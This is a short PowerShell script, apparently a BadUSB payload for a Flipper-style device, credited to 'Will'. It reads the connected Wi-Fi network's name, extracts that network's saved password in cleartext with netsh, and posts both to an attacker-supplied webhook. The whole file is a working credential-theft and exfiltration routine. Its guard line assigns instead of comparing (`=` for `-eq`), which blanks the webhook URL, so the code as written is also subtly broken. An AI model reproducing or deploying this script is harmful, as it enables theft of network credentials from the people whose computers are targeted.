# Created by Will | @willsflipper

# :::       ::: ::::::::::: :::        :::        
# :+:       :+:     :+:     :+:        :+:        
# +:+       +:+     +:+     +:+        +:+        
# +#+  +:+  +#+     +#+     +#+        +#+        
# +#+ +#+#+ +#+     +#+     +#+        +#+        
#  #+#+# #+#+#      #+#     #+#        #+#        
#   ###   ###   ########### ########## ##########

$webhookUrl = "$wh"
if ($webhookUrl = '') {exit}
$ssid = netsh wlan show interface | Select-String -Pattern ' SSID '
$ssid = [string]$ssid
$pos = $ssid.IndexOf(':')
$ssid = $ssid.Substring($pos+2).Trim()
$pass = (((netsh.exe wlan show profiles name="$ssid" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
Invoke-WebRequest -Method Post -Uri "$webhookUrl" -Body "$ssid : $pass"
